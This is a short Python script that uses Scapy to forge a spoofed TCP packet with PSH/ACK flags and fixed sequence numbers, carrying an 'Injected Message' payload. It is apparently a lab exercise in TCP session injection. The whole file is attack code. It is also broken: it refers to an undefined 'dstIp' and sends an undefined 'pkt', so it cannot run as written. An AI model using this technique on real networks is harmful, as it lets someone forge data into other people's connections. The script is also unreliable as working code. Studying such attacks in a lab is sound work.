from scapy.all import *

srcIP = "10.0.2.20"
dstIP = "10.0.2.30"

srcPort = 12345
dstPort = 12345

seqNum = 12345
ackNum = 12345

injectionMessage = "Injected Message"


ip = IP(src=srcIP, dst=dstIp)
tcp = TCP(sport=srcPort, dport=dstPort, seq=seqNum, ack=ackNum, flags="PA")
data = injectionMessage

packet = ip/tcp/data
send(pkt)
